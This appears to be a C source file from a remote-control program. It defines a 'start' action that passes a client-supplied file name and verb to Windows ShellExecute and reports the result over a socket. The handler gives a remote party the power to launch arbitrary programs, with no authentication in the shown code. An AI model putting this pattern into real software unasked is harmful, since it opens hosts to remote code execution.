#include "nn_actions.h"

int action_start(char *args[], client_t *cl) //name="start" - arg1=file-to-start - arg2=option
{
    char buffer[512];

    if(args[0] == NULL || args[1] == NULL)
    {
        a_printf("action_start", "need at least two args");
        strcpy(buffer, "failed/action=\"action_start\"/reason=\"need at least two args\"//");
        safe_send(cl->s, buffer, strlen(buffer), 0);
        return 1;
    }

    int r = (int) ShellExecute(NULL, args[1], args[0], 0, 0, SW_SHOWDEFAULT);
    sprintf(buffer, "result/action=\"action_start\"/return=%d//", r);
    safe_send(cl->s, buffer, strlen(buffer), 0);

    return 0;
}
